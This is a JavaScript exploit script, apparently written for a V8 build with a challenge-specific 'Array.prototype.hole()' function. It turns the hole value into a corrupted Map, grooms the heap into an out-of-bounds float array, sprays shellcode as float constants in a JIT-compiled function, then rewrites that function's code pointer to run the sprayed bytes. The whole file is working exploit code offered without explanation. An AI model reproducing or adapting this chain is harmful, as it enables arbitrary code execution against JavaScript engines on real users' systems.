// local offsets
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
    int_view[0] = this;
    return float_view[0];
}

Number.prototype.f2i = function() {
    float_view[0] = this;
    return int_view[0];
}

Number.prototype.i2f = function() {
    return BigInt(this).i2f();
}

function hex(a) {
    return "0x" + a.toString(16);
}




var map1 = null;
var foo_arr = null;
var obj_arr = null;
var ab = null;
var foo = null;
function getmap(){
    let hole = Array.prototype.hole();

    var map = new Map();
    var victim = [1.1,1.2,1.3];
    map.set(1, 1);
    map.set(hole, 1);

    map.delete(hole);
    map.delete(hole);
    map.delete(1);
    return map
}

function gc() {
    for (let i = 0; i < 1; ++i) {
        let buffer = new ArrayBuffer(2 ** 35 - 1).buffer;
  }
}
ab = new ArrayBuffer(4);
nogc = [];

for (let i = 0; i < 1000; i++) {
    map1 = getmap(map1);
    nogc.push(map1);
    
    foo_arr = new Array(1.1, 1.1);
    obj_arr = new Array(0x1337,{});
    
    nogc.push(foo_arr);
    nogc.push(obj_arr);
    
}


map1.set(0x10, -1);

gc();
foo = ()=>
{
    return [1.0,
        1.971182936312695e-246, 
        1.957059683370094e-246, 
        1.9711829275191414e-246,
        1.971025155563905e-246, 
        1.9711125195806515e-246,
        1.9710251539303214e-246,
        1.9711826571398815e-246,
        1.9710435748055855e-246,
        1.971025156844263e-246, 
        1.9711832076594195e-246,
        1.9711823546555445e-246,
        1.9710251537800814e-246,
        1.9711829000963798e-246,
        1.935386242414015e-246, 
        1.9322135955320268e-246,
        5.547942592569329e-232, 
        5.547942592563475e-232, 
        5.548386605550227e-232, 
        5.497621117806851e-232, 
        5.547942592563292e-232, 
        5.555290044135785e-232, 
        5.547942592582329e-232, 
        5.5479944671360564e-232,
        5.547942597961432e-232, 
        5.5483866105641465e-232,
        5.548206933798644e-232, 
        5.5479425977377224e-232,
        5.548387882601246e-232, 
        5.5483850737849856e-232,
        5.547942597164718e-232, 
        5.548385878712101e-232, 
        5.548210797194847e-232, 
        5.5479581402263505e-232,            
        1.1];
}


for (let i = 0; i < 0x10000; i++) {
	foo();foo();foo();foo();
}

map1.set(foo_arr, 0xffff);

console.log(foo_arr.length);

var code_index = 100;
var code_lo_lo = foo_arr[code_index].f2i() & 0xffffffffn;
var code_lo_hi = foo_arr[code_index].f2i() & 0xffffffff00000000n;
var sc_ptr = code_lo_hi >> 32n;
sc_ptr += 0x79n;
var new_code = (sc_ptr << 32n | code_lo_lo);
foo_arr[code_index] = new_code.i2f();
foo()
